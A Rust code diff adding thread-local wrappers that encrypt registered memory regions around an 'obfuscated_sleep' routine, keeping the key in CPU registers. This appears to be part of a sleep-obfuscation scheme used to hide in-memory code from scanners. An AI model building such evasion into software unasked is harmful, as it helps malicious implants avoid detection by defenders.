@@ -230,8 +230,34 @@ pub fn unlock(handle: KeyHandle) -> Result<()> {
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
+// Sleep-window wrappers used by `obfuscated_sleep`
+// ──────────────────────────────────────────────────────────────────────────────
+
+thread_local! {
+    static SLEEP_KEY_HANDLE: std::cell::RefCell<Option<KeyHandle>> = const { std::cell::RefCell::new(None) };
+}
+
+/// Encrypt all registered regions and stash the key handle thread-locally so
+/// the matching `unguard_memory()` call can retrieve it.
+pub fn guard_memory() -> Result<()> {
+    let h = lock()?;
+    SLEEP_KEY_HANDLE.with(|c| *c.borrow_mut() = Some(h));
+    Ok(())
+}
+
+/// Restore all registered regions using the previously-stashed key handle.
+/// Returns an error if no matching `guard_memory()` call preceded it.
+pub fn unguard_memory() -> Result<()> {
+    let h = SLEEP_KEY_HANDLE
+        .with(|c| c.borrow_mut().take())
+        .ok_or_else(|| anyhow::anyhow!("unguard_memory called without prior guard_memory"))?;
+    unlock(h)
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
 // KeyHandle — register stash
 // ──────────────────────────────────────────────────────────────────────────────
+
 
 /// Opaque handle that holds the 32-byte encryption key in CPU registers.
 ///
